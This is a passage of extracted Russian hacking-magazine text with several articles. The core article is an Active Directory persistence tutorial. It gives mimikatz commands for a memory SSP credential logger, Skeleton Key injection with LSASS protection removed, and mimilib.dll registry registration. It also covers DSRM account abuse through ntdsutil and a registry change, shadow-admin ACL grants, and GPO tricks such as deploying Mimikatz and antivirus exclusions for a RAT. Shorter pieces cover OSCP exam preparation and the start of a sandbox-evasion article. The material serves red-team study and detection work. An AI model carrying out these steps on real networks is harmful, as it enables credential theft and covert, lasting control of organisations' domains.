мирования (на самом микроконтроллере уже про шит соответству ющий бут‐
лоадер). В 2020 году Type‐C наконец‐то начина ет выглядеть почти как стан‐
дарт, так что, если у тебя уже есть блок питания для четвертой «малинки»,
сможешь заряжать Flipper и с его помощью тоже.
  Впрочем, куда важнее другое: микроконтроллер STMF412 может работать
как USB Device, так что с подходящей прошивкой Flipper при подключении
к компьютеру будет выглядеть и как HID‐устройство, и как флешка, и как
COM‐порт (но вряд ли все сра зу, конечно).


КРАУДФАНДИНГ





Сегодня Flipper пока существует в виде про тоти пов. До середины весны
новые рабочие версии регулярно изготавливались в Китае и пересылались
разработчикам в Россию. Одна ко корона вирус внес свои коррективы, и мно‐
гие сроки авторам пришлось пересмотреть. Сей час они планируют анон‐
сировать кампанию по сбо ру средств на серийное производство девайса и в
мае выйти на одну из кра удфандинговых площадок. Первые экземпляры
доберутся до обладателей не раньше зимы, и мы, конечно же, не упус тим
случая написать обзор.
ВЗЛОМ
БЭКДОРЫ
В ACTIVE DIRECTORY

ИСПОЛЬЗУЕМ
ГРУППОВЫЕ ПОЛИТИКИ,
ЧТОБЫ СОХРАНИТЬ
ДОСТУП К ДОМЕНУ





        RalfHacker
   hackerralf8@gmail.com





Во время атаки на инфраструктуру Active Directory очень важ‐
но сохранить полученный доступ. Для этого используются
различные методы и средства, в том числе — особен ности
групповых политик и бэкдоры. В этой статье мы рассмотрим
использование групповой политики и некоторых методов
внедрения в критические про цессы для поддержания при‐
вилегированного доступа.


Дру гие статьи про ата ки на Active Directory
 • Разведка в Active Directory. Получаем пользовательские данные в сетях
   Windows без привилегий
 • Атаки на Active Directory. Раз бира ем акту альные методы повыше ния при‐
   вилегий
 • Боковое перемещение в Active Directory. Раз бираем техники Lateral Move‐
   ment при атаке на домен
 • Защита от детекта в Active Directory. Уклоняемся от обнаружения при атаке
   на домен
 • Защита от детекта в Active Directory. Как обмануть средства обнаруже ния
   при атаке на домен
 • Сбор учеток в Active Directory. Как искать критически важные данные
   при атаке на домен
 • Закрепляемся в Active Directory. Как сохранить дос туп при атаке на домен




           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный информацией из этой статьи.



ОБЪЕКТЫ ГРУППОВОЙ ПОЛИТИКИ
Групповая политика поз воляет администра торам управлять компьютерами
и пользователями в Active Directory. Она состоит из нес кольких частей и в
большой компании может оказаться сложной в использовании без прив‐
лечения сторонних инстру ментов.
   Групповые политики сохраня ются как объекты групповой политики (GPO),
которые затем связываются с объекта ми Active Directory. Дело в том, что груп‐
повые политики могут включать парамет ры безопас ности, разделы реестра,
правила  установки  программно го обеспечения,  сценарии  для  запус ка
и завершения работы, а члены домена обновляют параметры групповой
политики по умолчанию каждые 90 минут на сво их машинах и каждые 5 минут
на контроллере домена.
  В большинстве случаев в домене точно нас троены:
 • один объект групповой политики, определяющий обязательный пароль,
   Kerberos и политики всего домена;
 • один объект групповой политики, настро енный для подразделения кон‐
   троллеров домена;
 • один объект групповой политики, нас троенный для подразделения сер‐
   веров и рабочих станций.

Посмотреть групповые политики можно в окне «Диспетчер серверов →
Управление груп повой политикой».





                   Управление груп повой политикой

Файлы, которые содержат параметры политики («Шаблон групповой полити‐
ки») расположены по пути C:\Windows\SYSVOL\[domain]\Policies\ на кон‐
троллере домена.





                Шаблон групповой политики

Используя  PowerShell  Active  Directory Get‐ADObject, можно проверить
наличие объекта групповой политики и его клю чевые поля, интересу ющие
нас.


PS > Get‐ADObject 'CN={428FE319‐FF53‐4569‐94A3‐7C855A82570E},
CN=Policies,CN=System,DC=domain,DC=dom'



  Использование Get‐ADObject для получения основной информации
  об объекте групповой политики


PS > Get‐ADObject 'CN={428FE319‐FF53‐4569‐94A3‐7C855A82570E},
CN=Policies,CN=System,DC=domain,DC=dom' ‐Properties displayname,
gpcfilesyspath,gpcmachineextensionnames,gpcuserextensionnames





  Использование Get‐ADObject для получения клю чевой информации
  об объекте групповой политики

При создании объекта групповой политики он может быть как связан, так и не
связан с каким‐либо объектом Active Directory. Если такая связь существует,
атрибут gPLink этого объекта будет обновлен и в него будет добавлено зна‐
чение DistinguishedName групповой полити ки. По этому признаку можно
определить, какие групповые политики применяются к данному объекту Active
Directory.
   Если мы перейдем в любую директорию объекта групповой политики, то
есть в C:\Windows\SYSVOL\[domain]\Policies\, то обнаружим следующие
вложенные объекты:
 1. Machine — директория с настройками машины для объекта групповой
   политики.
 2. User — директория с поль зовательскими нас тройками для объекта груп‐
   повой политики.
 3. GPT.INI — файл, который содержит парамет ры конфигурации объ екта
   групповой политики.





        Содер жимое директории объекта групповой политики

Групповая политика была соз дана, чтобы упростить управление ресурсами
в домене, однако зло умышленник также может использовать ее возможности
для своих целей. К примеру, таким обра зом можно подменить программы,
создать запланированные задачи, добавить новую локальную учетную запись
на все компьюте ры. Также приведу спи сок интерес ных возможностей,
которыми лично поль зовался сам или видел, как пользовались другие опе‐
раторы.
 1. Использование сценариев PowerShell или VBS для нас тройки членства
   в группах на уровне домена.
 2. Запуск Invoke‐Mimikatz на всех контроллерах домена в качестве SYSTEM
   через определен ный промежу ток времени (например, раз в три дня).
 3. Получение учетной записи krbtgt, а затем пла нирование задачи запуска
  DCSync на определенных машинах во всем лесу с использовани ем под‐
   дельных билетов Kerberos.
 4. Установка  RAT  и  добавление  исключения  в  антивирусные  правила
   в домене или лесу.

Применение групповой политики по умолчанию заключается в обновле нии
групповой политики на клиентах. При этом если новая политика совпадает
со старой, та обновляться не будет. Назначить раз решения для политики
можно в том же разделе «Управление груп повой политикой», выбрав политику
и перейдя к настрой кам делегирова ния.





                   Раз решения групповой полити ки

Так мы можем добавлять задачи, выполняемые от име ни адми нистратора
домена на всех компьютерах домена.


SEENABLEDELEGATIONPRIVILEGE
Эта привилегия определяет разрешение доверия к учетным записям компь‐
ютеров и пользователей при делегировании. Таким образом, она рас‐
пространяется на домен, а не на локальную машину в этом домене. Право
SeEnableDelegationPrivilege контролиру ет изменение свойства msDS‐Al‐
lowedToDelegateTo, которое содержит объекты для ограниченного делеги‐
рования.
  Исходя из этого, оператор не может изменить ни настройки управления
учетными записями пользователей, свя занные с делеги рованием, ни свой‐
ство msDS‐AllowedToDelegateTo для объекта, если мы не обладаем при‐
вилегией SeEnableDelegationPrivilege.


        Запрет на изменение свойства msDS‐AllowedToDelegateTo

Так как право SeEnableDelegationPrivilege при менимо только на самом
контроллере домена, операто ру необходимо про верить политику контрол‐
лера  домена  по  умолчанию  (имеет  guid  {6AC1786C‐016F‐11D2‐945F‐
00C04fB984F9}). Проверить данную нас трой ку можно в файле \MACHINE\Mi‐
crosoft\Windows NT\SecEdit\GptTmpl.inf для данной политики.





                Разрешение SeEnableDelegationPrivilege



                     Имя объекта по SID

Иными словами, по умолчанию только админис траторы имеют право изме‐
нять параметры делегирова ния. Если мы имеем пра ва GenericAll/Gener‐
icWrite для любых объектов в домене, нам необходимо получить привиле‐
гию SeEnableDelegationPrivilege. Сделать  это проще, чем  кажется.
Допишем имя учетной записи в ука занный выше файл.




     Разрешение SeEnableDelegationPrivilege после добавления записи

При добавлении любого SID или имени пользователя в любую строку данного
файла в разделе [Privilege Rights] изменения вступают в силу, когда кон‐
троллер домена или пользователя перезагружают или обновляют групповую
политику.


PS > $Policy = Get‐DomainPolicy ‐Source DC
PS > $Policy['Privilege Rights']['SeEnableDelegationPrivilege']



                SeEnableDelegationPrivilege в [Privilege Rights]

Таким образом, если целевой пользователь обладает полными правами
на любого другого поль зователя в домене, то оператор может изменить зна‐
чения свойства msDS‐AllowedToDelegateTo для подконтрольного поль‐
зователя, делегировав права абсолютно на любую службу в домене. Кон‐
троль над всеми службами в домене дает нам контроль над всем доменом.


SECURITY SUPPORT PROVIDER
Security Support Provider Interface (SSPI) — программный интерфейс в Mi‐
crosoft Windows между приложениями и про вайдерами безопасности. SSPI
используется для отделения протоколов уровня приложения от деталей
реализации сетевых про токолов безопас ности и обес печивает уровень абс‐
тракции для поддержки множес тва механизмов аутентификации.
   SSPI позволяет легко рас ширять методы проверки подлиннос ти Windows,
позволяя добав лять новых поставщиков поддержки безопасности (SSP). Вот
некоторые из стандартных служб SSP:
 1. NTLM — это протокол аутентификации, исполь зуемый в сетях, которые
   вклю чают машины с операционной системой Windows.
 2. Kerberos — определяет, как клиенты взаимодейству ют со службой сетевой
   аутентификации на основе билетов.
 3. Negotiate — это SSP, который действует как прикладной уровень между
   SSPI и другими поставщиками общих служб.
 4. Schannel — это SSP, который содержит набор протоколов безопасности,
   обеспечивающих идентификацию личности и безопасную конфиденциаль‐
  ную связь посредством шифрования.
 5. Digest — это SSP, который реализует упрощенный протокол аутентифика‐
   ции для сторон, участву ющих в обмене данными на основе протоколов
  HTTP или SASL.
 6. CredSSP — это SSP, позволяющий приложению делеги ровать учетные
   данные пользователя для удаленной аутентифика ции.

Но мы можем добавить свой SSP в сис тему Windows. Имеющийся в mimikatz
модуль SSP обеспечива ет автоматичес кую регис трацию локально аутен‐
тифицированных учетных данных. Таким образом, оператор сможет получать
актуальный пароль учетной записи компь юте ра, учетные данные служб, а так‐
же все учетные записи, которые авторизу ются в сис теме.
   Есть два способа сделать это. Первый — воспользоваться модулем misc.


mimikatz # privilege::debug
mimikatz # misc::memssp




            Использование модуля misc::memssp mimikatz

Но этот способ не переживет перезаг рузки машины. Теперь разберем более
сложный, но надежный второй способ. Необходимо скопировать mimilib.
dll в папку C:\Windwows\System32. После этого надо обновить запись
в реестре по пути HKEY_LOCAL_MACHINE\System\CurrentControlSet\Con‐
trol\Lsa\Security Packages, добавив туда mimilib.



                 Запись Security Packages в реес тре

Теперь все данные авториза ции будут регистрироваться в журнале C:\Wind‐
wows\System32\kiwissp.log.




                 Запись Security Packages в реес тре





             Пароль поль зователя root в открытом виде

Используя групповые политики, можно собирать информацию со всех жур‐
налов всех машин в домене, а также сохранять их в какой‐нибудь обще дос‐
тупный ресурс.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

         БЭКДОРЫ
    ACTIVE DIRECTORY  В
              ИСПОЛЬЗУЕМ ГРУППОВЫЕ ПОЛИТИКИ,
              ЧТОБЫ СОХРАНИТЬ ДОСТУП К ДОМЕНУ





СПИСКИ ДОСТУПА И ДЕСКРИПТОРЫ БЕЗОПАСНОСТИ
Учетные записи теневого администра тора (shadow admins) — это учетные
записи, которые имеют «нег ласные» привилегии и обычно остаются незаме‐
ченными, так как они не входят в привилегиро ванную группу Active Directory.
Как правило, привилегии таким учетным записям предоставле ны за счет пря‐
мого назначения разрешений (списков доступа). Поскольку учетная запись
теневого администратора обла дает неявными привиле гиями и ее сложнее
обнаружить (она не состоит ни в каких привилегированных группах), то она
наиболее приоритетна для оператора.
  Каждый объект в Active Directory имеет свой собственный спи сок раз‐
решений ACE (записи контроля доступа), которые в совокупности составля ют
ACL (список контроля доступа). ACL каждого объекта определяет, кто имеет
разрешения на этот конкрет ный объект и какие действия могут быть выпол‐
нены с ним.





            ACL группы «Администраторы домена для всех»





           ACL группы «Администраторы домена для System»

То есть группе «Администра торы домена» по умолчанию предоставляется
полный доступ ко всем объектам домена. Но оператор может взять неп‐
ривилегированную учетную запись пользователя и предос тавить ей те же
ACE, что и группе «Администра торы домена». Такая учетная запись и будет
классифицироваться как учетная запись тенево го администратора.
  Преимущество этого метода состоит в том, что обнаружить его можно,
только постоянно отслеживая списки контроля доступа, что на самом деле
делается очень редко либо вооб ще никогда. Рас смотрим три самых рас‐
пространенных варианта использования метода.
  Первый вариант — ког да оператор предоставляет учетной записи полный
контроль над группой «Администра торы домена».





        Полный контроль над группой «Администра торы домена»

В данном варианте учетная запись не сос тоит в ука занной группе и не явля‐
ется привилегированной, но в любой момент может добавить себя или дру‐
гую подконтрольную учетную запись в эту группу, выполнить необходимые
действия и удалиться из группы.
   Второй вариант — ког да оператор предоставляет учетной записи раз‐
решение «Сбросить пароль» для другой учетной записи из группы «Админис‐
траторы домена».





   Разрешение «Сбросить пароль» для учетной записи «Администратор»

И третий вариант — когда оператор предоставляет учетной записи привиле‐
гии на репликацию изменений катало га.





            Разрешения на реп ликацию изменений каталога

Лю бой пользователь с таким раз решени ем имеет возможность реплициро‐
вать любые объекты, включая пароли. Это дает оператору право на выпол‐
нение атаки DCSync.


DIRECTORY SERVICES RESTORE MODE
Каждый контроллер домена имеет внут реннюю учетную запись локального
администратора. Она называется учетной записью режима восстановления
служб каталогов (DSRM). Причем пароль для данной учетной записи редко
подлежит изменению, так как основной способ сделать это на контроллере
домена заключается в запуске инстру мента командной строки ntdsutil.
   Есть  возможность синхро низировать пароль DSRM  на  контроллере
домена с определенной учетной записью домена. Установить пароль можно,
выпол нив последователь но следующие команды.


> ntdsutil
: set dsrm password
: reset password on server null
: []
: q
: q





                      Замена пароля DSRM

Но дело в том, что пользователь DSRM по умолчанию — это «Администра‐
тор». Таким образом, их пароли совпадают. Но оператор может связать поль‐
зователя DSRM с любым другим пользователем домена.


> ntdsutil
: set dsrm password
: sync from domain account [пользователь]
: q
: q





       Связывание пользователя DSRM с дру гой учетной записью

После того как удалось свя зать учетную запись DSRM с дру гой учетной
записью, определимся, как ее можно использовать. Первым делом добавим
свойство DsrmAdminLogonBehavior в HKLM:\System\CurrentControlSet\
Control\Lsa\. Возможные значения:
 • 0 (по умолчанию): мож но использовать учетную запись DSRM, только если
  DC запущен в DSRM;
 • 1: можно использовать учетную запись DSRM для входа в систему, если
   локальная служба AD остановлена;
 • 2: всегда можно использовать учетную запись DSRM.

Для авторизации по сети (ведь это запись адми нис тратора DSRM) нам необ‐
ходимо выставить значение 2.


PS> New‐ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"
‐Name "DsrmAdminLogonBehavior" ‐Value 2 ‐PropertyType DWORD





           Добавление свой ства DsrmAdminLogonBehavior




             Свойство DsrmAdminLogonBehavior в реестре

При этом опе ратору не нужно знать пароль пользователя, достаточно хеша
пароля (для path the hash). Если значение свойства DsrmAdminLogonBehavior
равно 2, а оператор может изменить пароль DSRM, то данный способ поз‐
воляет ему сохранить права администра тора на контроллере домена даже
при изменении всех паролей пользователей и компьютеров домена.


SKELETON KEY
Skeleton Key — это особенное вредонос ное программное обеспечение,
которое позволяет легко понижать защищенность учетных записей в домене
Active Directory с точки зрения авторизации. Эта программа внедряется
в про цесс LSASS и создает там собственный пароль, который будет актуален
для любой учетной записи домена. Причем настоящие пароли тоже будут
действительны, поэто му риск, что бэкдор обна ружат, значительно снижается.
  В сетях Windows, как пра вило, есть два основных метода аутентификации:
NTLM и Kerberos. И оба этих метода подвергаются вмешательству Skeleton
Key. Таким образом, при NTLM‐аутентифика ции хеш пароля сравнивается
не с базой SAM, а с хешем Skeleton Key внутри LSASS. В случае с Kerberos
шифрование будет понижено до алго ритма, который не поддерживает соль
(RC4_HMAC_MD5). Поэтому хеш, проверяемый на стороне сервера, будет
удовлетворять хешу Skeleton Key, и аутентифика ция всегда будет успешной.
  Для внедрения бэкдора необходимы права админис тратора домена.
Но стоит помнить,  что, поскольку используется внедрение в процесс,
перезагрузка контрол лера домена удалит вредоносную программу. При этом
выпол нить атаку очень прос то, для это го нужен mimikatz.


mimikatz # privilege::debug
mimikatz # misc::skeleton





             Внедрение Skeleton Key с помощью mimikatz

В результате этих действий появился еще один пароль, который также
работает для поль зователя: mimikatz.



            Авторизация с поддельным паролем Skeleton Key



            Авторизация с реальным паролем пользователя

При этом данный пароль подходит для авто риза ции под абсолютно любой
учетной записью пользователя домена.



  Авторизация под поль зователем «Администра тор» с паролем Skeleton
  Key



      Авторизация под пользователем notroot с паролем Skeleton Key

Стоит также упомянуть и LSA. При внедрении бэкдора может появиться сле‐
дующая ошибка.


      Авторизация под пользователем notroot с паролем Skeleton Key

Чтобы избежать этого, нам нужно выполнить атаку в обход LSA. Но и это нес‐
ложно сделать с помощью mimikatz.


mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton





             Внедрение бэкдора Skeleton Key в обход LSA


ЗАКЛЮЧЕНИЕ
Можно сказать, что Skeleton Key — это метод, который оператор может
использовать для доступа к хос там и сетевым ресурсам без необ ходимости
взламывать пароли пользователей домена. Полученный этим способом дос‐
туп сохраняется после смены паролей всех поль зовате лей (включая адми‐
нистраторов) до перезагрузки контроллера домена.
  Для тех, кто хочет получить больше информа ции по этой теме, я создал
телеграм‐канал @RalfHackerChannel. Здесь можно задать свои вопросы
или ответить на вопросы дру гих юзеров.
ВЗЛОМ
   ГЛАВНОЕ ОБ
 OSCP

                          КАК СДАВАТЬ
           ОДИН ИЗ САМЫХ СЛОЖНЫХ
        ЭКЗАМЕНОВ ПО БЕЗОПАСНОСТИ





                                                                                        f0x1sland
                                                                                         f0x1sland@protonmail.com





Про сертификат OSCP не слышал, наверное, только человек
далекий от инфосека. К этому экза мену долго готовятся,
сдают его целые сутки, а потом пишут райтапы. Те, кто
еще не сдавал, зада ют о нем много воп росов — в твиттере,
на «Реддите», форумах, в чатах. У меня тоже была масса
вопросов, когда я начинал готовиться, и я попробую здесь
ответить на основные из них.


OSCP (Oﬀensive Security Certiﬁed Professional) — сертификат, который выдает
организация Oﬀensive Security. Интересна эта сертификация в первую оче‐
редь тем, что требует практических навыков, а зна чит, нас ждет море радости
и фана, а иногда боли и бессонных ночей (это уж как пойдет). В любом слу чае
такой сертификат будет отличным пунктом в резюме: экзамен организован
так, что подстав ному лицу сдать его очень трудно, то есть он подтверждает
именно твои навыки.
   Чтобы   получить   пра во   сдавать   экза мен,   нужно   заплатить
минимум 999 дол ларов. За эту сумму ты получишь материалы курса PWK
(Penetration  testing with  Kali), в который входит 30 дней доступа к лабе
для отработки практичес ких навыков, комплект видео и толстая книжка (точ‐
нее, PDF) на 853 страницы. Все материалы, естес твенно, на английском,
но изложено доступно, и уровня B1 будет более чем достаточно.


ПОДГОТОВКА
Огромная доля вопросов каса ется подготовки. Что смотреть, что качать (ну
кроме оче редного гоблина‐мага в WoW), где практиковаться? В общем,
неопределенность пол ная, как и во мно гих жизненных вопросах.


Пе ред лабой
Перед тем как покупать PWK и проходить лабу, можно многому научиться
самостоятельно (что вообще характерно для профессии: саморазвиваться,
самообучаться и искать информацию нуж но будет всегда).
   Что тебе пригодится? Во‐первых, и обучение, и экзамен будут проходить
на Kali Linux, и было бы неплохо в нем разоб рать ся. Если вдруг не сталкивал‐
ся с ним, не пугайся: это просто дистрибутив на основе Debian с кучей все‐
возможного хакерского софта, который может пригодиться в работе. Не все
работает из короб ки, не все оптимизи рова но, но это популярный выбор,
который помогает быс тро получить дос туп к необ ходимым инструментам.
Работа с этим дистрибутивом мало чем отличает ся от работы с любым дру‐
гим сортом Debian (вроде Ubuntu), поэтому описывать ее подробно не имеет
смысла. Если ты уже имел дело с Linux, то, несомненно, раз берешься. Если
нет, то стоит начать с азов Linux.
   Что нужно еще? (Если ты уже отличаешь LFI от LPE, то можно не читать
этот список.)
 • Иметь хотя бы базовые зна ния о том, как работа ет компьютер: как взаимо‐
   действуют процессор и память, IO, буфер, куча и так далее.
 • Иметь представление об устройстве ОС (Linux и Windows) и ори енти‐
   роваться в них, быть знакомым с их командной оболочкой.
 • Уметь программировать, опять же хотя бы на уровне простых скриптов.
 • Уметь пользоваться основными инс трументами: Nmap, netcat, tcpdump
   (Wireshark), Metasploit, SearchSploit, gobuster (wfuzz, fuﬀ) и прочими.
 • Знать, какие бывают атаки, уязвимости и спо собы их экс плуатации.
 • Знать, как повышать привилегии на атакованной и взломанной машине
   (LPE, privesc).

С теорией, уверен, ты спра вишься сам. Перехо дим к самому инте ресному —
где практиковаться.
  Первое место, где можно получить практичес кие навыки, приближенные
к боевым, — это сервис Hack The Box. Сервис предос тавляет набор машин
с уязвимостями и позволяет отточить полученные в теории навыки. Есть плат‐
ная и бесплатная версии. На этом сервисе много раз ных машин, но в сети
товарищ TJnull составил и пополняет список OSCP‐like‐машин.





Большинство этих машин имеют статус retired («на пенсии») и доступны толь‐
ко в платной вер сии, но оно того стоит.
  Еще одна платформа для практики — VulnHub. Сервис предоставляет вир‐
туальные машины с набором уяз вимостей. Их можно развернуть у себя и раз‐
влекаться сколько угодно. В документе, который кто‐то добрый выложил
в Google Drive, есть набор машин в сти ле OSCP из этого сервиса. Некоторые
машины старые, но и сам OSCP использует далеко не новые уязвимости.


             INFO

                        Статья «Где учиться пен тесту» подробнее расска‐
                      зывает о площадках Hack The  Box, Root Me
                      и VulnHub. Также «Хакер» периодически публику‐
                         ет райтапы прохождения машин с Hack The Box.


Вносит неоценимый вклад в обучение еще один житель сети — IppSec.
По всем машинам из HTB он записывает подробное видео, где демонстри‐
рует разные тех ники: recon, enumeration, privesc и прочие. Его главное пре‐
имущество для меня в том, что он предлага ет несколько вариантов добиться
одного и того же результата. Например: можно просканировать порты
при помощи Nmap или быстро написать свой скрипт на Bash или Python,
для перечисления на вебе использовать не только привычный dirb, но и аль‐
тернативные тулзы — gobuster, fuﬀ, wfuzz — или написать быстро свою.
   Есть еще масса других сервисов: root‐me, Web Security Academy раз‐
работчиков Burp, Hack this site и другие, их можно найти в поисковике.
  Общая рекомендация: читай райтапы, смотри, как делают другие, учись
и практикуйся, практикуйся, практикуйся. И пробуй все машины ломать
без использования «Метаспло ита». Ищи эксплоиты, правь, разбирайся, что,
как и почему именно так работа ет.
   Когда поломаешь все машины из списка и почувствуешь себя настоящим
надмозгом, настанет пора покупать PWK.


Во вре мя лабы
Есть три версии курса, отличаются они только длительностью дос тупа
к лаборатории. Мне кажет ся, если ты уже решил машины TJnull, то оптималь‐
ный вариант — это 60 дней. Можно выб рать 30 или, если чувству ешь, что
дело затянется, 90 — здесь решай сам в зависи мос ти от уве ренности в себе
и финансов.





После покупки тебе нужно будет наз начить  дату начала лаборатории.
Выбирать надо из списка доступных дат, делается это, чтобы оптимизи ровать
нагрузку на лабу. Затем тебе на почту придут ссылки и кре ды для дос тупа
к лабе. Конфиг для OpenVPN лучше ска чать сра зу, чтобы не просить тех‐
поддержку восстанавливать доступ (как это делал я :D). Ссыл ка будет дос‐
тупна 72 часа.
  В назначенный день (точнее, ночь) тебе дадут возможность скачать
материалы: книгу и видео. Все материалы содержат «водяной знак» с име‐
нем, фамилией и адресом проживания (ука зываются при регис трации и нуж‐
ны для выдачи и получения сертифика та), поэтому заливать материалы
на торрент не стоит! :)
  Видео от книги не отличается, дик тор прос то читает то, что написано
в книге, и воспроизводит на виртуалке. Причем читает слово в слово
(отличная практика для изу чающих английский). Поэтому выбирай то, что
удобнее для восприятия.
  В этом году курс обновили, существенно рас ширили и доработали.
Добавлены модули Active Directory, PowerShell, Introduction to Buﬀer Overﬂow,
Bash scripting, расширен список машин для практики. В разной степени
обновлены все модули. Сам экза мен остался без изменений (пока).
  Работать с лабораторией ты будешь через VPN. Понадобится обычный
клиент OpenVPN и конфиг к нему с логином и паролем. В лабе машин 50–60,
к части из них можно получить дос туп, только взломав предыдущую. Нет
какой‐то пошаговой инструкции, что за чем ломать, и каждый выбирает свой
способ. Машины очень раз ные по слож ности, какие‐то решаются быстро
и просто, какие‐то — боль (привет, Pain). В общем, все будет зависеть
от багажа знаний, с которым ты придешь.
  Сама сеть живая: пользователи переписываются, ходят на сайты и так
далее. В общем, это отличное мес то как для получения фана, так и для обу‐
чения.
  В аннотации к курсу ска зано, что не требуется специальных знаний.
С одной стороны, это так, курс подробно рассказывает о базовых скиллах,
необходимых для экзамена и лабораторных работ, но по факту (и это тоже
упоминается) большую часть зна ний нужно будет получать самостоятельно.
Поэтому важно не прос то прослушать  курс, а выполнить все задания
и решить если не все, то большую часть лабораторных машин. В общем‐то,
в этом прелесть курса — большую часть времени ты что‐то изучаешь, экспе‐
риментируешь, думаешь, раз виваешь ся.
   Весь  процесс  лучше  сразу  документировать,  заодно  научишься
это  делать. На экзамене это совершенно  точно потребуется. И если
по лабораторным работам написать отчет, то за это могут дать дополнитель‐
ные баллы.
  Делай скриншоты действий, файловой системы, выводов ipconfig, if‐
config или ip addr, вывод cat proof‐файлов и так далее. Для этих целей я
использую две программы: либо CherryTree, либо Joplin. В сети существуют
удобные шаблоны (TJ‐JPT и CTF_Template) для документирования экзамена
в этих программах. В шаблонах есть справка и при меры использования
основных инструментов, в информации легко ориентироваться благодаря
удобной дре вовидной структуре. Но, естественно, никто не запрещает тебе
использовать то, к чему ты привык.





                                       Joplin

Автоматизируй себе все рутинные задачи, даже если они короткие. Запуск
веб‐сервера для аплоада шелла на машину, генерацию шеллов под раз ные
задачи и так далее, чтобы не гуг лить и не набирать вручную по памяти длин‐
ные команды и не тратить на это дра гоценное время.
  Рано или поздно лаборатория кончится и нас танет время назначить дату
экзамена. Эта дата тоже будет ограничена интервалом (нельзя взять и через
год назначить себе экзамен).


ЭКЗАМЕН
По специальной ссылке, присланной вмес те с материалами лабы, назнача‐
ется дата и время экзамена. С это го времени у тебя будет 23 часа и 45 минут,
чтобы  получить  proof‐файлы из нужного количес тва машин и наб рать
минимум 70 баллов, необходимых для успешной сдачи экзамена (всего воз‐
можно 100 баллов плюс 5 баллов за отчет по лабе). Все машины име ют
вес 10, 20 или 25 баллов и различаются по сложности.
  Затем тебе дадут еще 24 часа, чтобы написать отчет по экзамену. После
этого в течение десяти рабочих дней придет ответ: сдал или не сдал. Тебе
понадобится удостоверение личности, понятное для экзаменатора  (заг‐
ранпаспорт, например). В интернете попадаются кейсы, когда экзамен
не засчитывали из‐за того, что в документе не было данных на английском.
Насколько им можно доверять, решай сам.
  Экзамен теперь очный, то есть будет присутс твовать представитель OS,
который через камеру наблюдает за процес сом. И иногда просит покрутить
камеру вокруг себя. В комнате, где проходит экза мен, никого быть не должно.
  На экзамене запрещено использовать:
 • коммерческие тулзы вроде Burp Pro, Nessus Pro, MSF Pro;
 • инструменты  для  автоматизации  эксплуата ции  (например,  sqlmap,
   browser_autopwn);
 • сканеры уязвимостей (все тот же Nessus даже в его essentials‐версии,
  OpenVAS и так далее);
 • различные виды спуфинга (IP, ARP и так далее).

Также запрещено применять функции любых дру гих инс трументов, которые
подпадают под эти ограничения.
   Что касается Metasploit. Им можно вос пользовать ся один раз за экзамен,
на одной из машин по тво ему выбору, и попыт ка всего одна, даже если она
окажется неудач ной.
  При этом доступны без ограничений:
 • exploit/multi/handler;
 • pattern_create.rb;
 • MSFvenom;
 • pattern_oﬀset.rb.

Эти 23 часа 45 минут отводятся на экзамен с учетом того, что нужно есть,
спать и ходить в туалет. Если интернет упал, время не продлят. Поэтому
заранее продумай резервную точку дос тупа.
  В остальном экзамен не отличается от лабы. Главное — не паниковать,
даже если ты не сдашь. Самое страшное, что тебя ждет, — придется оплатить
еще одну попытку. Поэтому работай с удоволь стви ем, не нервничай, и все
получится.
   Ну и самый главный совет, который не только помог мне с OSCP, но и
вообще пригождается: никогда не сдавайся! Да, банально, да, избито,
но ничего лучше пока не придума ли.


ЗАКЛЮЧЕНИЕ
Я думаю, этот экзамен стоит сдать каждому, кто име ет отношение к прак‐
тической информационной безопасности. Он не научит всему (это невоз‐
можно, да и не ставит такой цели), но даст главное: умение добиваться пос‐
тавленной цели и учить ся самостоятельно. Заодно ты получишь опыт пос‐
ледовательно разбирать ся в проблеме, работать в стрессовой ситуации и в
условиях серьезных ограничений.
   Это не просто тест, где ты тыкаешь в ответ, если хорошо зазубрил теорию.
Без навыков и фундаментальных знаний ты прос то его не сдашь, а посадить
вместо себя еще кого‐то тоже не выйдет. Так что этот экзамен станет
отличным подтверждением твоих скиллов, а понимающие работодатели
это ценят.
  Поверь, ничего ужасного и очень уж сложного в OSCP нет — при условии,
что ты хорошо готовился. Все необходимое тебе дос тупно, и остается только
вопрос времени и желания. Сам я считаю, что это отличный опыт.
ВЗЛОМ





                                                                                            Boris Razor
                                                                               Инженер ИБ, увлекаюсь
                                                                                      средствами анализа
                                                                                     вредоносного ПО. Люблю
                                                                                      проверять маркетинговые
                                                                                       заявления на практике :)
                                                                                     mainboros777@gmail.com





                                                                                             Alex Mess
                                                                                      ИБтивист. Исследую в ИБ то,
                                                                                              что движется. То, что не
                                                                                       движется, кладу в песочницу.
                                                                                                nayca@mail.ru

 ВРЕДОНОС
      ПОД НАБЛЮДЕНИЕМ

             КАК РАБОТАЮТ СЕНДБОКСЫ
                  И КАК ИХ ОБОЙТИ




Один из способов детектировать малварь — запустить ее
в «песочнице», то есть изолированной среде, где можно
следить за поведением вредоно са. В этой статье мы пос‐
мотрим, как устроены сендбоксы, и изучим приемы укло‐
нения от детекта — и широко осве щенные в интерне те,
и принципиально новые, упо минания о которых не удалось
найти ни в специализирован ной литера туре, ни на просторах
Сети.


Борьба вирусописателей и про изво дителей антивирусов — это борьба тех‐
нологий: с появлением новых методов защиты сра зу же появляются методы
противодействия. Поэто му многие вредонос ные программы первым делом
проверяют, не запуще ны ли они в виртуальной машине или песочнице. Если
вредоносу кажется, что он выполняется не на реаль ном «железе», то он, ско‐
рее всего, завершит работу.
   Технику обхода песочниц часто называ ют термином Sandbox Evasion. Эту
технику используют мно гие кибергруппировки, например PlugX или Cozy Bear
(APT29). Так, нашумевшая группировка Anunak (авторы известного трояна
Carbanak) использовала встроенное в документ изображение, которое акти‐
вирует полезную нагрузку, когда пользователь дважды щелкает по нему.
  Проще всего понять, как работа ют механизмы обнаружения виртуальных
сред, с использованием возможностей PowerShell и WMI.


ПРИМЕР ПОСТРОЕНИЯ ПЕСОЧНИЦЫ
Традиционный враг любого вируса — специально подготовленная виртуаль‐
ная машина, в которой исследователь запускает образец вредоносного ПО.
Иногда вирусные аналитики используют сложные автоматизированные сис‐
темы для анализа объектов в изолированной среде на потоке с минимальным
участием челове ка. Такого рода ПО или программно‐аппаратные комплексы
поставляют разные компании, в час тности FireEye (Network/Email Security),
